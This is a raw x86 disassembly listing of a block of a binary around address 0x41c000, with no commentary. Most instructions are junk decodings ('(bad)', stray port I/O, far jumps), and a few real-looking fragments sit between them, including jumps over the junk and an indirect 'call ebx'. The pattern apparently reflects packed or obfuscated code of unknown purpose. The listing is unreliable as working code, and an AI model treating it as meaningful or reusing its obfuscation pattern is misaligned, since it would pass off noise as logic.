  41c071:	mov    dl,0x44
  41c073:	sub    esi,DWORD PTR [ebx+0x55040b29]
  41c079:	pop    eax
  41c07a:	sbb    DWORD PTR [ebx],ebp
  41c07c:	xchg   edi,eax
  41c07d:	(bad)  [ebx-0x2a0ace2]
  41c083:	dec    edx
  41c084:	xchg   edi,eax
  41c085:	call   0xc7ef0cd2
  41c08a:	adc    BYTE PTR [eax],0x2a
  41c08d:	ror    ch,cl
  41c08f:	adc    dh,BYTE PTR [ebp+0xf0e77a7]
  41c095:	dec    ebx
  41c096:	mov    eax,ds:0xb44dd9d8
  41c09b:	push   esi
  41c09c:	push   ecx
  41c09d:	call   0x717d999c
  41c0a2:	xor    cl,BYTE PTR [ebx]
  41c0a4:	sub    esp,DWORD PTR [eax+0x14a7b0fe]
  41c0aa:	int3   
  41c0ab:	cdq    
  41c0ac:	xor    BYTE PTR [edi+eiz*8],dh
  41c0af:	jp     0x41c0c3
  41c0b1:	sahf   
  41c0b2:	daa    
  41c0b3:	push   ebx
  41c0b4:	add    BYTE PTR [edx-0x7d743f1f],al
  41c0ba:	jge    0x41c0fc
  41c0bc:	jno    0x41c0ea
  41c0be:	ins    BYTE PTR es:[edi],dx
  41c0bf:	hlt    
  41c0c0:	stos   BYTE PTR es:[edi],al
  41c0c1:	clc    
  41c0c2:	push   0x40e11470
  41c0c7:	xchg   BYTE PTR [ecx],dl
  41c0c9:	pop    es
  41c0ca:	stc    
  41c0cb:	xor    DWORD PTR [ebx-0x6d],ebp
  41c0ce:	test   ecx,edx
  41c0d0:	stos   BYTE PTR es:[edi],al
  41c0d1:	fld    st(0)
  41c0d3:	and    cl,0x6b
  41c0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0d7:	lods   eax,DWORD PTR ds:[esi]
  41c0d8:	mov    ebp,0x7a1ff9e6
  41c0dd:	test   DWORD PTR [edx],ecx
  41c0df:	dec    esp
  41c0e0:	not    BYTE PTR [edi]
  41c0e2:	rcl    DWORD PTR [esi+0x68],0xcb
  41c0e6:	fnstcw WORD PTR [ebp-0x7d]
  41c0e9:	sbb    al,0x1c
  41c0ec:	push   esi
  41c0ed:	pop    ecx
  41c0ee:	sub    eax,0x8022978
  41c0f3:	adc    al,0x2e
  41c0f5:	sub    eax,0x7d4e84ab
  41c0fa:	(bad)  
  41c0fb:	aad    0x98
  41c0fd:	adc    DWORD PTR [esp+ecx*2+0x60],ebp
  41c101:	push   esi
  41c102:	push   esi
  41c103:	test   al,0xc5
  41c105:	out    0xf1,al
  41c107:	out    0x88,eax
  41c109:	fwait
  41c10a:	push   0xffffff83
  41c10c:	sub    eax,0xec26361e
  41c111:	fild   WORD PTR [ebx-0x4f6e8fca]
  41c117:	(bad)  
  41c118:	and    eax,0x19d49886
  41c11d:	push   0x52733b01
  41c122:	call   0x89746f1b
  41c127:	cwde   
  41c128:	daa    
  41c129:	cmp    ebp,edx
  41c12b:	stc    
  41c12c:	jle    0x41c173
  41c12e:	ror    BYTE PTR [ecx-0x61de6808],1
  41c134:	inc    esi
  41c135:	call   0xa88f01e9
  41c13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c13b:	mov    dl,0xaa
  41c13d:	fsub   QWORD PTR [ebp+0x55]
  41c140:	jmp    0x8052:0x2a277047
  41c147:	jmp    0x5af91984
  41c14c:	jge    0x41c1b6
  41c14e:	retf   0x2183
  41c151:	xchg   ecx,eax
  41c152:	dec    edx
  41c153:	cs fucomip st,st(5)
  41c156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c157:	sub    BYTE PTR [edx+0x7de4067f],0xc1
  41c15e:	sbb    eax,DWORD PTR ds:0xabc42f26
  41c164:	or     ah,ch
  41c166:	mul    ebx
  41c168:	mov    ch,ah
  41c16a:	test   eax,0xef67108d
  41c16f:	loope  0x41c135
  41c171:	test   al,0x61
  41c173:	cmp    eax,0xd52b1f6d
  41c178:	sub    eax,0x36c5c4f
  41c17d:	mov    ebp,0xcd953e3c
  41c182:	xchg   ecx,eax
  41c183:	push   0xffffff93
  41c185:	xchg   esp,eax
  41c186:	mov    eax,0xef6be1d0
  41c18b:	mov    esi,0x27ad9089
  41c190:	mov    ecx,0xbb350cf4
  41c195:	shl    dh,0x8c
  41c198:	jbe    0x41c12c
  41c19a:	jo     0x41c1ca
  41c19c:	pop    esi
  41c19d:	rcr    esp,cl
  41c19f:	jbe    0x41c203
  41c1a1:	test   BYTE PTR [edx],bh
  41c1a3:	ds dec ecx
  41c1a5:	or     eax,0x60092004
  41c1aa:	(bad)  
  41c1ab:	retf   0x589a
  41c1ae:	fdivr  QWORD PTR [esi+0x7b]
  41c1b1:	mov    eax,0xd2a52e6b
  41c1b6:	mov    al,ds:0x6e3fe95
  41c1bb:	sbb    al,0x63
  41c1bd:	push   esi
  41c1be:	js     0x41c206
  41c1c0:	gs dec esi
  41c1c2:	sbb    dh,BYTE PTR [ebx+0x6a]
  41c1c5:	inc    esi
  41c1c6:	stc    
  41c1c7:	pop    ss
  41c1c8:	xchg   ebp,eax
  41c1c9:	dec    edx
  41c1ca:	push   esp
  41c1cb:	mov    fs,WORD PTR [edx+ecx*2-0x7b]
  41c1cf:	xchg   ebp,eax
  41c1d0:	imul   esp,esi,0x3838b82b
  41c1d6:	cdq    
  41c1d7:	xchg   ebx,eax
  41c1d8:	mov    dh,0xd0
  41c1da:	adc    al,0x19
  41c1dc:	mov    ah,0x76
  41c1de:	(bad)  
  41c1df:	mov    eax,0xc40993d3
  41c1e4:	push   ebp
  41c1e5:	inc    esp
  41c1e6:	mov    ebp,0xf0b6334f
  41c1eb:	aam    0x1d
  41c1ed:	out    0xa3,eax
  41c1ef:	clc    
  41c1f0:	in     eax,dx
  41c1f1:	adc    edi,DWORD PTR [ebp-0x189adae0]
  41c1f7:	jl     0x41c1b8
  41c1f9:	jae    0x41c17f
  41c1fb:	xchg   esi,eax
  41c1fc:	sbb    bl,ah
  41c1fe:	inc    ebx
  41c1ff:	test   eax,0x62e943b9
  41c204:	mov    ebx,0x4e0a12ab
  41c209:	cmp    cl,BYTE PTR ss:[eax]
  41c20c:	mov    edx,0xa1d0c3d4
  41c211:	jb     0x41c21b
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	pusha  
  41c22c:	cmp    al,0xb6
  41c22e:	push   es
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c249
  41c238:	outs   dx,DWORD PTR ds:[esi]
  41c239:	imul   eax,DWORD PTR [esi-0x770f250d],0xf5276d5c
  41c243:	int    0x37
  41c245:	loope  0x41c2a1
  41c247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c248:	jno    0x41c27a
  41c24a:	sbb    eax,0x14a1d032
  41c24f:	(bad)  
  41c250:	cli    
  41c251:	cli    
  41c252:	or     al,0x45
  41c254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c255:	aam    0xf9
  41c257:	daa    
  41c258:	add    BYTE PTR [edi],dl
  41c25a:	jl     0x41c239
  41c25c:	sti    
  41c25d:	and    DWORD PTR [eax],ebx
  41c25f:	pop    esi
  41c260:	daa    
  41c261:	jmp    0xd20a6f94
  41c266:	mov    dl,0x1a
  41c268:	fist   WORD PTR [eax+0x2c]
  41c26b:	mov    bl,0x7b
  41c26d:	mov    ecx,0x323ff634
  41c272:	stos   BYTE PTR es:[edi],al
  41c273:	ret    
  41c274:	cmp    DWORD PTR [ecx],0x2ba46d15
  41c27a:	cmp    edi,eax
  41c27c:	fwait
  41c27d:	add    bh,ch
  41c27f:	scas   al,BYTE PTR es:[edi]
  41c280:	in     eax,dx
  41c281:	imul   ebx,ecx,0x3c
  41c284:	mov    edx,0x3cc73671
  41c289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c28a:	ret    
  41c28b:	int3   
  41c28c:	adc    edx,DWORD PTR [edi-0x65]
  41c28f:	sub    BYTE PTR [edx],al
  41c291:	pop    edi
  41c292:	dec    eax
  41c293:	repnz pop edi
  41c295:	out    0xa5,eax
  41c297:	lods   al,BYTE PTR ds:[esi]
  41c298:	inc    edx
  41c299:	jg     0x41c313
  41c29b:	jae    0x41c2cf
  41c29d:	test   BYTE PTR [edi-0x48],dh
  41c2a0:	lds    eax,FWORD PTR [edx-0x60fd998e]
  41c2a6:	rcl    DWORD PTR [esi],cl
  41c2a8:	sub    ah,dl
  41c2aa:	mov    bl,0xdf
  41c2ac:	lock out dx,al
  41c2ae:	sbb    al,0xc7
  41c2b0:	cdq    
  41c2b1:	rcr    BYTE PTR [esi-0x1677eea6],0xcf
  41c2b8:	dec    ecx
  41c2b9:	ins    BYTE PTR es:[edi],dx
  41c2ba:	xchg   ecx,eax
  41c2bb:	fst    DWORD PTR [ebx]
  41c2bd:	retf   
  41c2be:	shl    ah,0x98
  41c2c1:	xor    ecx,DWORD PTR [ebp+0x5256d8b3]
  41c2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2c8:	jl     0x41c2cd
  41c2ca:	adc    esp,esi
  41c2cc:	mov    cl,0x3c
  41c2ce:	cmp    ebx,eax
  41c2d0:	jae    0x41c2d9
  41c2d2:	jmp    0x41c345
  41c2d4:	add    al,0x4f
  41c2d6:	test   BYTE PTR [edi-0x6e],bl
  41c2d9:	mov    cl,0xfa
  41c2db:	pop    ds
  41c2dc:	lock lods eax,DWORD PTR ds:[esi]
  41c2de:	das    
  41c2df:	push   ebx
  41c2e0:	jne    0x41c358
  41c2e2:	imul   edi,DWORD PTR [esi+0x6797baa6],0xc4078101
  41c2ec:	mov    eax,0xb49f379d
  41c2f1:	(bad)  
  41c2f2:	sti    
  41c2f3:	push   ebx
  41c2f4:	ja     0x41c2fe
  41c2f6:	popf   
  41c2f7:	repz mov bl,0x34
  41c2fa:	dec    eax
  41c2fb:	cmp    ebx,DWORD PTR [edx]
  41c2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fe:	(bad)  
  41c2ff:	popa   
  41c300:	out    0xc0,eax
  41c302:	add    bl,0xf5
  41c305:	pop    edi
  41c306:	inc    ebx
  41c307:	add    ebx,esi
  41c309:	inc    esp
  41c30a:	in     al,dx
  41c30b:	mov    edi,0x476349c7
  41c310:	iret   
  41c311:	inc    ebp
  41c312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c313:	loopne 0x41c35c
  41c315:	fiadd  DWORD PTR [edi]
  41c317:	jno    0x41c2da
  41c319:	fcom   DWORD PTR [ecx-0x65]
  41c31c:	lock push cs
  41c31e:	out    0x66,eax
  41c320:	or     DWORD PTR [eax+eax*1-0xd],0xf540cce
  41c328:	adc    BYTE PTR [ecx-0x41035a6d],0x53
  41c32f:	int    0xc9
  41c331:	in     al,dx
  41c332:	mov    ch,BYTE PTR [eax+eax*4]
  41c335:	push   ds
  41c336:	inc    eax
  41c337:	shl    BYTE PTR [edx],0xe8
  41c33a:	(bad)  
  41c33b:	aad    0x7c
  41c33d:	es mov bl,0x5f
  41c340:	push   esi
  41c341:	push   esp
  41c342:	pop    esi
  41c343:	je     0x41c2e3
  41c345:	aad    0x67
  41c347:	cld    
  41c348:	pop    ecx
  41c349:	(bad)  
  41c34a:	out    dx,eax
  41c34b:	mov    DWORD PTR [esi],ebx
  41c34d:	in     eax,0x63
  41c34f:	sub    ah,cl
  41c351:	in     eax,dx
  41c352:	jmp    0xc68252e
  41c357:	and    cl,BYTE PTR [eax+ecx*4+0x2c]
  41c35b:	sbb    al,0x23
  41c35d:	jbe    0x41c312
  41c35f:	cli    
  41c360:	cmp    eax,DWORD PTR [eax+0x290e7986]
  41c366:	jmp    0x41c312
  41c368:	ficom  WORD PTR ds:0xaa34594e
  41c36e:	add    BYTE PTR [eax+0x7d],bh
  41c371:	mov    BYTE PTR [edx+0x29],cl
  41c374:	(bad)  
  41c375:	dec    ecx
  41c376:	push   esp
  41c377:	(bad)  
  41c379:	xchg   ecx,eax
  41c37a:	xchg   esp,eax
  41c37b:	dec    ch
  41c37d:	xor    dh,BYTE PTR [edi]
  41c37f:	xchg   ecx,eax
  41c380:	jl     0x41c3ca
  41c382:	retf   
  41c383:	mov    cl,0x36
  41c385:	fisubr DWORD PTR [ebp-0x2c584cbf]
  41c38b:	loop   0x41c3ba
  41c38d:	mov    cl,0x2c
  41c38f:	jg     0x41c3f0
  41c391:	mov    ebp,0xd67dcf69
  41c396:	cmp    ecx,DWORD PTR [edx-0x411b1b62]
  41c39c:	data16 sub bl,BYTE PTR [edx-0x3da8b988]
  41c3a3:	cwde   
  41c3a4:	les    edi,FWORD PTR [edi+0x71]
  41c3a7:	sahf   
  41c3a8:	mov    eax,0xc38d79c1
  41c3ad:	enter  0xba27,0xb3
  41c3b1:	pop    es
  41c3b2:	jl     0x41c350
  41c3b4:	ins    DWORD PTR es:[edi],dx
  41c3b5:	sahf   
  41c3b6:	jne    0x41c351
  41c3b8:	mov    edi,0x96fc3cc9
  41c3bd:	ja     0x41c41a
  41c3bf:	scas   al,BYTE PTR es:[edi]
  41c3c0:	push   edi
  41c3c1:	(bad)  
  41c3c2:	sub    al,0x2e
  41c3c4:	std    
  41c3c5:	add    ebp,DWORD PTR [ebx]
  41c3c7:	jp     0x41c419
  41c3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ca:	pop    ds
  41c3cb:	pop    esi
  41c3cc:	inc    esi
  41c3cd:	or     cl,BYTE PTR [esi]
  41c3cf:	sbb    eax,0x6fb10589
  41c3d4:	or     al,0x94
  41c3d6:	bnd jp 0x41c442
  41c3d9:	scas   al,BYTE PTR es:[edi]
  41c3da:	lods   al,BYTE PTR ds:[esi]
  41c3db:	dec    edi
  41c3dc:	scas   al,BYTE PTR es:[edi]
  41c3dd:	mov    edi,0x4b9ba975
  41c3e2:	loope  0x41c3e9
  41c3e4:	pop    esp
  41c3e5:	or     dh,BYTE PTR [ebx+edi*4-0x5b]
  41c3e9:	std    
  41c3ea:	or     edi,edx
  41c3ec:	mov    cl,BYTE PTR [edx-0x1a8b560c]
  41c3f2:	dec    edx
  41c3f3:	mov    dl,0xc4
  41c3f5:	xchg   esi,eax
  41c3f6:	inc    ebx
  41c3f7:	push   0xdfb7a5e
  41c3fc:	das    
  41c3fd:	mov    ds:0x3719bdc4,eax
  41c402:	js     0x41c481
  41c404:	sub    al,0xc7
  41c406:	pop    esi
  41c407:	push   es
  41c408:	fs jno 0x41c3f1
  41c40b:	adc    edi,ebp
  41c40d:	or     eax,0x2f03a3
  41c412:	cmp    dl,BYTE PTR [ecx]
  41c414:	sti    
  41c415:	cdq    
  41c416:	xchg   DWORD PTR [esi-0x65],ebp
  41c419:	xchg   esi,eax
  41c41a:	jns    0x41c427
  41c41c:	in     eax,dx
  41c41d:	(bad)  
  41c41e:	adc    esp,0xffffff80
  41c421:	adc    BYTE PTR [edx+0x41],0xe5
  41c425:	xor    edx,eax
  41c427:	lock or edx,DWORD PTR [ebx]
  41c42a:	xchg   DWORD PTR [esp+ebp*4+0x26],ebp
  41c42e:	dec    eax
  41c42f:	(bad)  
  41c431:	sti    
  41c432:	ret    0xc1c0
  41c435:	add    ch,BYTE PTR [edx+0x64e2ccac]
  41c43b:	add    bh,ah
  41c43d:	bound  ecx,QWORD PTR [edi-0x59caae2f]
  41c443:	xchg   esp,eax
  41c444:	jmp    0xb2da:0x56048dd7
  41c44b:	mov    ah,0xdf
  41c44d:	sti    
  41c44e:	fwait
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c4a0
  41c464:	into   
  41c465:	scas   al,BYTE PTR es:[edi]
  41c466:	(bad)  
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c485
  41c470:	adc    eax,0xd36ceac8
  41c475:	idiv   DWORD PTR [ebx+edi*4]
  41c478:	pop    ebx
  41c479:	push   ds
  41c47a:	inc    esp
  41c47b:	xor    ebp,DWORD PTR [ecx+0x5d]
  41c47e:	mov    edi,0xec36a5a2
  41c483:	mov    dh,0xef
  41c485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c486:	add    edx,esi
  41c488:	xchg   BYTE PTR [eax+0xf],bh
  41c48b:	jp     0x41c45e
  41c48d:	les    eax,FWORD PTR [eax]
  41c48f:	or     bh,BYTE PTR ds:0x274bfb7e
  41c495:	loop   0x41c47f
  41c497:	push   esi
  41c498:	jb     0x41c465
  41c49a:	arpl   WORD PTR [eax+0x21],ax
  41c49d:	pusha  
  41c49e:	adc    ah,BYTE PTR [ebx+0x41]
  41c4a1:	adc    ebx,DWORD PTR [eax+0x2a]
  41c4a4:	ret    
  41c4a5:	xor    dl,cl
  41c4a7:	push   0x55434856
  41c4ac:	adc    al,0x2e
  41c4ae:	loop   0x41c506
  41c4b0:	sbb    BYTE PTR [esi+0x61fea2a1],0xb9
  41c4b7:	scas   eax,DWORD PTR es:[edi]
  41c4b8:	adc    BYTE PTR [ebp+0x6d596559],dl
  41c4be:	adc    bh,BYTE PTR [eax]
  41c4c0:	ror    ebx,cl
  41c4c2:	jbe    0x41c470
  41c4c4:	ja     0x41c4f0
  41c4c6:	in     al,dx
  41c4c7:	and    eax,0xcf3a7c18
  41c4cc:	sbb    eax,0x3127393
  41c4d1:	ds cdq 
  41c4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d4:	fs add al,0x27
  41c4d7:	sar    BYTE PTR gs:[edi],cl
  41c4da:	dec    edx
  41c4db:	push   esp
  41c4dc:	and    BYTE PTR [edi-0x20],0x75
  41c4e0:	xchg   esi,eax
  41c4e1:	adc    al,BYTE PTR [ebp-0x3137915]
  41c4e7:	fcom   QWORD PTR [esi-0x7d5fe2]
  41c4ed:	pop    eax
  41c4ee:	frstor [edx+0x7ee650d6]
  41c4f5:	cwde   
  41c4f6:	retf   0x6e45
  41c4f9:	in     eax,dx
  41c4fa:	jl     0x41c4a8
  41c4fc:	lods   eax,DWORD PTR ds:[esi]
  41c4fd:	pusha  
  41c4fe:	das    
  41c4ff:	push   edi
  41c500:	adc    edx,DWORD PTR [ecx]
  41c502:	lods   al,BYTE PTR ds:[esi]
  41c503:	push   es
  41c504:	mov    ds:0xaed402aa,al
  41c509:	icebp  
  41c50a:	xchg   esp,eax
  41c50b:	xor    eax,0x68769239
  41c510:	(bad)
  41c513:	ficomp DWORD PTR [ebp+0x56]
  41c516:	sub    ch,BYTE PTR [edx]
  41c518:	es rcr esp,1
  41c51b:	fld    st(6)
  41c51d:	jmp    0x400:0x6349f7ef
  41c524:	pusha  
  41c525:	adc    ebx,edi
  41c527:	xchg   ebx,eax
  41c528:	sahf   
  41c529:	pop    ss
  41c52a:	cmp    eax,0xd8d128c5
  41c52f:	clc    
  41c530:	aaa    
  41c531:	fwait
  41c532:	sbb    eax,0x728c78e5
  41c537:	jmp    0x41c5a7
  41c539:	repnz push eax
  41c53b:	xchg   ebp,eax
  41c53c:	xor    BYTE PTR [ebp+0x40],dh
  41c53f:	pop    edi
  41c540:	or     ecx,edx
  41c542:	xchg   ebx,eax
  41c543:	and    DWORD PTR [edi-0x5f1ad15e],esp
  41c549:	stc    
  41c54a:	pop    ebp
  41c54b:	push   esp
  41c54c:	mov    eax,0x29664555
  41c551:	jbe    0x41c4ed
  41c553:	retf   
  41c554:	push   es
  41c555:	imul   edi,esp,0xfffffffb
  41c558:	das    
  41c559:	(bad)
  41c55c:	sar    DWORD PTR [edx-0x4a],1
  41c55f:	lods   al,BYTE PTR ds:[esi]
  41c560:	imul   esi,DWORD PTR [esi],0x9ff39e22
  41c566:	sub    ecx,edx
  41c568:	out    dx,al
  41c569:	loop   0x41c595
  41c56b:	repz pop ecx
  41c56d:	sbb    BYTE PTR ds:0x78842af7,bh
  41c573:	and    al,0x61
  41c575:	aaa    
  41c576:	push   esp
  41c577:	cmp    dl,BYTE PTR ds:0x5e2f888f
  41c57d:	cmp    BYTE PTR [esi+0x56c5b52c],dh
  41c583:	test   ebx,ebx
  41c585:	hlt    
  41c586:	ror    BYTE PTR [bx+di-0x31f1],1
  41c58b:	repz sbb DWORD PTR [eax-0x19bb0fe1],edi
  41c592:	repnz stc 
  41c594:	inc    eax
  41c595:	and    BYTE PTR [edi-0x36],bh
  41c598:	xor    al,0xfc
  41c59a:	fmul   DWORD PTR [edi+0x6234e6bc]
  41c5a0:	pop    edx
  41c5a1:	retf   0x1bc
  41c5a4:	adc    BYTE PTR [ebx-0x7262b30d],dl
  41c5aa:	inc    esp
  41c5ab:	fwait
  41c5ac:	fs adc eax,0xf6d31f2a
  41c5b2:	or     BYTE PTR [eax+0x21ad79ed],ah
  41c5b8:	js     0x41c5aa
  41c5ba:	jle    0x41c5cf
  41c5bc:	nop
  41c5bd:	or     dh,BYTE PTR [ebx-0x71]
  41c5c0:	push   ss
  41c5c1:	fwait
  41c5c2:	and    ecx,DWORD PTR [edi-0x18b69d69]
  41c5c8:	adc    BYTE PTR [eax],ch
  41c5ca:	rcl    dl,0xb7
  41c5cd:	inc    esp
  41c5ce:	pop    es
  41c5cf:	sbb    eax,0xa7701437
  41c5d4:	ja     0x41c574
  41c5d6:	fmul   DWORD PTR [edi+0x4d7b6606]
  41c5dc:	leave  
  41c5dd:	ss push esi
  41c5df:	ins    DWORD PTR es:[edi],dx
  41c5e0:	inc    esp
  41c5e1:	mov    ebx,0x590ecc99
  41c5e6:	in     eax,dx
  41c5e7:	xchg   DWORD PTR [edi],ecx
  41c5e9:	jge    0x41c5f9
  41c5eb:	push   ebx
  41c5ec:	adc    eax,0x7fb7f2cb
  41c5f1:	enter  0x4109,0x32
  41c5f5:	xchg   ebx,eax
  41c5f6:	jo     0x41c616
  41c5f8:	sbb    BYTE PTR gs:[eax+0x40353837],0x36
  41c600:	outs   dx,DWORD PTR ds:[esi]
  41c601:	(bad)
  41c604:	xor    esp,DWORD PTR [ebx+0x17876cd6]
  41c60a:	mov    ah,al
  41c60c:	cmp    al,0x4e
  41c60e:	push   edi
  41c60f:	ins    BYTE PTR es:[edi],dx
  41c610:	mov    edx,DWORD PTR [ebp+0x645c775e]
  41c616:	fdivr  QWORD PTR [eax]
  41c618:	retf   
  41c619:	fnstsw ax
  41c61b:	hlt    
  41c61c:	adc    al,0xb9
  41c61e:	or     eax,0xc564ff8a
  41c623:	or     DWORD PTR [edi-0x7c],edi
  41c626:	push   ds
  41c627:	in     al,dx
  41c628:	dec    BYTE PTR [ebp-0x6de8be2d]
  41c62e:	(bad)  
  41c62f:	adc    eax,DWORD PTR [edi+0x708b42c4]
  41c635:	jmp    0xb05d:0xaf8d782c
  41c63c:	add    esp,DWORD PTR [esi-0x78]
  41c63f:	push   0x5a5b5929
  41c644:	add    al,0x67
  41c646:	(bad)  [ecx]
  41c648:	nop
  41c649:	sub    al,0x7d
  41c64b:	sbb    edi,edx
  41c64d:	call   0x2a95:0xd7dd745
  41c654:	adc    BYTE PTR [edi+0x25615a98],ah
  41c65a:	scas   eax,DWORD PTR es:[edi]
  41c65b:	adc    DWORD PTR [esi],ecx
  41c65d:	or     ch,BYTE PTR [esi-0x74]
  41c660:	outs   dx,DWORD PTR ds:[esi]
  41c661:	jl     0x41c5e5
  41c663:	ja     0x41c64e
  41c665:	mov    dl,0x30
  41c667:	hlt    
  41c668:	mov    esp,0x79ef3816
  41c66d:	and    esp,edi
  41c66f:	in     eax,0x6d
  41c671:	xor    al,0x46
  41c673:	pop    es
  41c674:	test   al,0x55
  41c676:	adc    eax,0xc97818ec
  41c67b:	icebp  
  41c67c:	dec    edi
  41c67d:	mov    ch,BYTE PTR [ebx-0x38]
  41c680:	pop    esp
  41c681:	inc    ebx
  41c682:	aas    
  41c683:	sub    al,0x84
  41c685:	sbb    al,0x99
  41c687:	xor    ebx,ebx
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x8c41773e,eax
  41c6cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6cd:	adc    eax,0x787ff100
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c661
  41c6d7:	(bad)  
  41c6d8:	(bad)  
  41c6d9:	dec    edx
  41c6da:	das    
  41c6db:	sbb    cl,cl
  41c6dd:	cli    
  41c6de:	xor    edi,DWORD PTR [eax-0x4a]
  41c6e1:	xchg   ecx,eax
  41c6e2:	fmul   DWORD PTR [edx]
  41c6e4:	out    dx,al
  41c6e5:	inc    eax
  41c6e6:	xchg   dl,bl
  41c6e8:	adc    bl,dl
  41c6ea:	test   bl,bl
  41c6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6ed:	bound  edi,QWORD PTR [edx-0x7e]
  41c6f0:	jo     0x41c765
  41c6f2:	retf   
  41c6f3:	lods   al,BYTE PTR ds:[esi]
  41c6f4:	lds    edx,FWORD PTR [ebx+edx*2+0x5f]
  41c6f8:	jmp    0x41c707
  41c6fa:	add    esi,ebp
  41c6fc:	adc    dl,BYTE PTR [eax+0xc95b454]
  41c702:	or     eax,esi
  41c704:	retf   0xb4c4
  41c707:	adc    dh,BYTE PTR [ebp+0x19e37a59]
  41c70d:	rcl    BYTE PTR [edi],1
  41c70f:	imul   ebx,DWORD PTR [edx+esi*8-0x16549986],0xd2e37a52
  41c71a:	pop    es
  41c71b:	xchg   ebp,eax
  41c71c:	pop    ebp
  41c71d:	mov    ch,0x68
  41c71f:	push   esi
  41c720:	dec    eax
  41c721:	retf   
  41c722:	mul    BYTE PTR [ecx]
  41c724:	xchg   edi,eax
  41c725:	out    0xc0,eax
  41c727:	inc    ebx
  41c728:	pushf  
  41c729:	lods   eax,DWORD PTR ds:[esi]
  41c72a:	adc    ax,0xa314
  41c72e:	retf   0x1e38
  41c731:	sbb    al,0xfc
  41c733:	icebp  
  41c734:	jmp    0x41c767
  41c736:	cs loopne 0x41c763
  41c739:	(bad)  
  41c73a:	mov    DWORD PTR gs:[ecx+0x31],esp
  41c73e:	inc    ebx
  41c73f:	push   0xffffff80
  41c741:	neg    ebx
  41c743:	xchg   ecx,eax
  41c744:	std    
  41c745:	imul   esp,esp,0xed246364
  41c74b:	sub    BYTE PTR [edx+0x38aebac1],bh
  41c751:	shl    DWORD PTR [eax+0x1b],cl
  41c754:	push   ecx
  41c755:	fnstsw WORD PTR [edx-0x74]
  41c758:	dec    ebp
  41c759:	not    BYTE PTR [edi]
  41c75b:	test   BYTE PTR ds:0x12847bc7,cl
  41c761:	mov    bh,ah
  41c763:	or     DWORD PTR [eax+0x49],eax
  41c766:	mov    ecx,0xef205b97
  41c76b:	bound  ecx,QWORD PTR [ecx-0x2e]
  41c76e:	sbb    eax,0xe097e598
  41c773:	clc    
  41c774:	fs and eax,0x4cc3b673
  41c77a:	stos   DWORD PTR es:[edi],eax
  41c77b:	mov    dh,0x15
  41c77d:	ffree  st(3)
  41c77f:	jne    0x41c7cd
  41c781:	popa   
  41c782:	sub    eax,ecx
  41c784:	jl     0x41c7aa
  41c786:	add    BYTE PTR [ebp+edx*8-0x4658821a],bh
  41c78d:	push   esp
  41c78e:	push   ebp
  41c78f:	xchg   DWORD PTR [ebx],edx
  41c791:	push   edi
  41c792:	outs   dx,BYTE PTR ds:[esi]
  41c793:	xchg   edx,eax
  41c794:	sahf   
  41c795:	icebp  
  41c796:	stos   BYTE PTR es:[edi],al
  41c797:	stos   BYTE PTR es:[edi],al
  41c798:	imul   esp,DWORD PTR [eax],0x581a67b
  41c79e:	mov    esp,0x77d6a623
  41c7a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7a4:	test   al,0xa2
  41c7a6:	pop    eax
  41c7a7:	push   eax
  41c7a8:	shl    ebx,1
  41c7aa:	fcom   QWORD PTR [edx-0x333504b0]
  41c7b0:	jmp    0x41c811
  41c7b2:	mov    WORD PTR [edx+0x491cc4bf],ss
  41c7b8:	push   ebp
  41c7b9:	(bad)  
  41c7ba:	call   0x747e042e
  41c7bf:	rcr    BYTE PTR [ecx+0x12],cl
  41c7c2:	mov    bl,0x79
  41c7c4:	pop    edi
  41c7c5:	das    
  41c7c6:	sub    dl,bl
  41c7c8:	popf   
  41c7c9:	inc    eax
  41c7ca:	test   eax,0x6eb134ad
  41c7cf:	hlt    
